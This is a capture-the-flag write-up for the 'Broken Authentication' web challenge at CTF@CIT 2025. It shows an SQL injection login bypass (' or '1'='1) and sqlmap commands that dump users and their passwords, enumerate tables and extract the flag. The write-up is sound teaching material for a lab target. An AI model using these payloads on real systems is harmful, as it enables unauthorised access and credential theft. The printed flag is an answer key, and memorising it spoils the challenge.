---
title: "Broken Authentication - CTF@CIT 2025"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "sqlmap", "broken", "authentication", "ctf-cit", "ctf-cit-2025", "2025", "ctf-writeup"]
summary: "![](<https://www.youtube.com/watch?v=ZBdApaw0r0M?t=6> \"Breaking Authentication (CIT CTF)\")"
source:
  name: "CTFtime writeup #40218"
  url: "https://ctftime.org/writeup/40218"
original_source: "https://cryptocat.me/blog/ctf/2025/cit/web/broken_authentication/"
ctf:
  name: "CTF@CIT 2025"
  year: 2025
  challenge: "Broken Authentication"
---

## Metadata

- **CTF:** CTF@CIT 2025
- **Task:** Broken Authentication
- **Author team:** CryptoCat
- **CTFtime:** <https://ctftime.org/writeup/40218>
- **Original writeup:** <https://cryptocat.me/blog/ctf/2025/cit/web/broken_authentication/>

---
[![](<https://img.youtube.com/vi/ZBdApaw0r0M/0.jpg>)](<https://www.youtube.com/watch?v=ZBdApaw0r0M?t=6> "Breaking Authentication (CIT CTF)")

### Part 1: SQL Injection (Auth Bypass)  
Basic login page. When we submit the username as `''` it returns the following error.  
```bash  
Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in /var/www/html/index.php:23  
Stack trace:  
#0 /var/www/html/index.php(23): mysqli->query('SELECT * FROM u...')  
#1 {main}  
thrown in **/var/www/html/index.php  
```**

Submit username and password as `' or '1'='1` and bypass the login panel.  
### Part 2: SQLi (DB Enumeration)

The admin panel says `As you can probably tell, this page is currently under construction.`

Checked the source, cookies, technologies etc but doesn't appear to be anything of use. Perhaps the flag is in the username/password and we need to return to the SQLi.  
```bash  
sqlmap -u http://23.179.17.40:58001/index.php --data "username=cat&password=meow&login=Login" --batch  
```

It finds the SQLi, so we dump the creds:  
```bash  
sqlmap -u http://23.179.17.40:58001/index.php --data "username=cat&password=meow&login=Login" --batch -T users --dump

+---------+----------+--------------+----------+  
| email | fullname | password | username |  
+---------+----------+--------------+----------+  
| <blank> | <blank> | m1n3r41s | hank |  
| <blank> | <blank> | 9f3IC3uj9^zZ | admin |  
| <blank> | <blank> | M4GN375 | jesse |  
| <blank> | <blank> | b4byb1u3 | walter |  
+---------+----------+--------------+----------+  
```

Tried to login with each account in case the admin UI changed, but it did not.

Let's see if there's any other tables.  
```bash  
sqlmap -u http://23.179.17.40:58001/index.php --data "username=cat&password=meow&login=Login" --batch -D app --tables

+---------+  
| secrets |  
| users |  
+---------+  
```

Nice! `secrets` sounds pretty promising ?  
```bash  
sqlmap -u http://23.179.17.40:58001/index.php --data "username=cat&password=meow&login=Login" --batch -T secrets --dump

+--------+-----------------------+  
| name | value |  
+--------+-----------------------+  
| flag | CIT{36b0efd6c2ec7132} |  
+--------+-----------------------+  
```

Flag: `CIT{36b0efd6c2ec7132}`
